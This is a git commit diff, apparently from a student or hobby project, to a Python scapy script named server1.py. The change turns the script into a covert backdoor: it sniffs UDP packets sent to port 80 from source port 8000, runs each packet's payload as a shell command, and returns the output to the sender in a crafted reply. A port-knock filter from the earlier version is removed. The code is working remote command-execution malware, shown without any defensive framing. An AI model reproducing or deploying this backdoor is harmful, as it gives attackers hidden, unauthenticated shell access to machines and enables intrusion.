c67aa9f27bb1bb3ca997f012f3432896d91e0da2
root <root@datacomm.ca>
2015-10-18 14:21:09 -0700

    server with command

--- server1.py
+++ server1.py
@@ -1,21 +1,27 @@
 #!/usr/bin/python
 
-import sys, os, argparse, socket, subprocess, logging
+import sys, os, argparse, socket, subprocess, logging, time
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+import subprocess
 
-KNOCK = [1000, 2000, 3000]
-FILTER = "udp and (dst port {0} or {1} or {2} or 80)".format(KNOCK[0], KNOCK[1], KNOCK[2])
+
+FILTER = "udp and (dst port 80) and (src port 8000)"
 
 
 def remoteExecute(pkt):
     print "==============================================="
-    print pkt.show
+    command = pkt['Raw'].load
+    print command
     print ""
 
-    pkt2 = IP(src=pkt["IP"].dst, dst=pkt["IP"].src)/UDP(dport=pkt['UDP'].sport,sport=pkt['UDP'].dport)/'yyyy'
+    variable = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    ouput = "\nOUTPUT:\n" + variable.stdout.read() + variable.stderr.read()
+
+    pkt2 = IP(src=pkt["IP"].dst, dst=pkt["IP"].src)/UDP(dport=pkt['UDP'].sport,sport=pkt['UDP'].dport)/ouput
     print pkt2.show
     print "==============================================="
+    time.sleep(0.5)
     send(pkt2)
 
 def stopfilter(pkt):
@@ -23,8 +29,7 @@ def stopfilter(pkt):
 
 def main():
 
-    while 1:
-        sniff(filter=FILTER, prn=remoteExecute, stop_filter=stopfilter)
+    sniff(filter=FILTER, prn=remoteExecute)
 
 if __name__ == '__main__':
     main()
